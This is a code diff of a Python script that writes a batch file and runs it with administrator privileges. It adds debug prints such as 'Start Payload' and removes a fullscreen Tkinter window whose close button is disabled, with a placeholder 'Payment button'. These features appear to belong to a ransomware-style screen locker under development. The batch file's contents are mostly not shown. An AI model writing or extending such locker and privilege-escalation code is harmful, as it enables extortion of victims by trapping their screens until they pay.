@@ -4,6 +4,8 @@ import os
 import sys
 import subprocess
 
+print("Start Payload")
+
 # The content of the batch file that will be executed with administrator privileges
 batch_content = '''@echo off
 :: Check if the script is running as administrator
@@ -46,6 +48,7 @@ pause
 
 # Path where the batch file will be created
 batch_file = 'admin_script.bat'
+print("Just created the bat")
 
 # Create the batch file
 with open(batch_file, 'w') as f:
@@ -58,21 +61,3 @@ try:
 except subprocess.CalledProcessError as e:
     print(f"Error while trying to run the batch file with administrator privileges: {e}")
 
-# Create the GUI application
-def create_fullscreen_app():
-    root = tk.Tk()
-
-    # Make the window full screen and unexitable
-    root.attributes('-fullscreen', True)
-    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable the close button
-
-    # Set gray background
-    root.configure(bg="gray")
-
-    # Add a Payment button
-
-    root.mainloop()
-
-
-def exit_app():
-    root.destroy()
